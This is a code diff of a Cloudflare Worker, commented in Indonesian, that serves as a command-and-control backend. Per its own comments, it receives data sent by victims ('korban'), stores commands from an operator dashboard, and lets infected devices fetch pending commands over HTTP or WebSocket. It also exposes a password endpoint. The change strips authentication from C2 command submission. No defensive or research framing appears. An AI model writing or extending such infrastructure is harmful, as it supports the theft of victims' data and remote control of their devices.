@@ -1,5 +1,5 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api (HANYA 3 ENDPOINT!)
+// Cloudflare Worker - verifikasi-api (FINAL - TANPA AUTH UNTUK C2!)
 // ================================================================
 
 // ============================================================
@@ -37,7 +37,7 @@ function unauthorizedResponse() {
 }
 
 // ============================================================
-// AUTHENTICATION - HANYA UNTUK DASHBOARD!
+// AUTHENTICATION - HANYA UNTUK GET /data DAN /api/data (DASHBOARD LIHAT DATA)!
 // ============================================================
 function isAuthenticated(request, env) {
   const url = new URL(request.url);
@@ -55,31 +55,28 @@ export default {
     const url = new URL(request.url);
     const method = request.method;
     
-    // OPTIONS - CORS Preflight
     if (method === 'OPTIONS') {
       return new Response(null, { headers: CORS });
     }
 
     // ============================================================
-    // 🔥 ENDPOINT 1: POST /data atau /api/data
-    // - Korban kirim data (TANPA AUTH)
-    // - Dashboard kirim C2 (PAKAI AUTH)
+    // 🔥 POST /data atau /api/data - TANPA AUTH! (KIRIM DATA & C2)
     // ============================================================
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
       return await handlePostData(request, env);
     }
 
     // ============================================================
-    // 🔥 ENDPOINT 2: GET /data atau /api/data
-    // - Dashboard lihat data (PAKAI AUTH)
-    // - Device ambil C2 (TANPA AUTH) via ?type=perintah
+    // 🔥 GET /data atau /api/data - CEK DULU:
+    //    - Jika ?type=perintah → TANPA AUTH (device ambil C2)
+    //    - Jika tidak → PAKAI AUTH (dashboard lihat data)
     // ============================================================
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
       return await handleGetData(request, env);
     }
 
     // ============================================================
-    // 🔥 ENDPOINT 3: GET /get-password (TANPA AUTH)
+    // 🔥 GET /get-password - TANPA AUTH!
     // ============================================================
     if (url.pathname === '/get-password' && method === 'GET') {
       return jsonResponse({ 
@@ -90,15 +87,13 @@ export default {
     }
 
     // ============================================================
-    // WEBSOCKET (TANPA AUTH)
+    // 🔥 WEBSOCKET - TANPA AUTH!
     // ============================================================
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
     }
 
-    // ============================================================
-    // ROOT - Health Check (TANPA AUTH)
-    // ============================================================
+    // ROOT - Health Check
     if (url.pathname === '/' && method === 'GET') {
       const raw = await env.DATA.get('data') || '[]';
       const data = JSON.parse(raw);
@@ -110,13 +105,12 @@ export default {
       });
     }
 
-    // 404
     return jsonResponse({ error: 'Not Found' }, 404);
   }
 };
 
 // ============================================================
-// HANDLER: POST /data
+// HANDLER: POST /data (TANPA AUTH - KORBAN & C2 BEBAS!)
 // ============================================================
 async function handlePostData(request, env) {
   try {
@@ -126,12 +120,8 @@ async function handlePostData(request, env) {
       return jsonResponse({ error: 'Invalid request body' }, 400);
     }
     
-    // 🔥 JIKA C2 COMMAND DARI DASHBOARD (HARUS PAKAI AUTH!)
+    // 🔥 C2 COMMAND DARI DASHBOARD (TANPA AUTH!)
     if (body.sumber === 'c2_command' || body.type === 'c2_command') {
-      if (!isAuthenticated(request, env)) {
-        return unauthorizedResponse();
-      }
-      
       const cmdData = body.data || body;
       cmdData.timestamp = Date.now();
       cmdData.status = 'pending';
@@ -175,7 +165,7 @@ async function handlePostData(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /data
+// HANDLER: GET /data (CEK TYPE PERINTAH)
 // ============================================================
 async function handleGetData(request, env) {
   const url = new URL(request.url);
@@ -279,7 +269,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      // COMMAND DARI DASHBOARD
+      // COMMAND DARI DASHBOARD (TANPA AUTH!)
       if (data.type === 'command') {
         await env.DATA.put('perintah', JSON.stringify(data.command));
         server.send(JSON.stringify({ type: 'command_received' }));
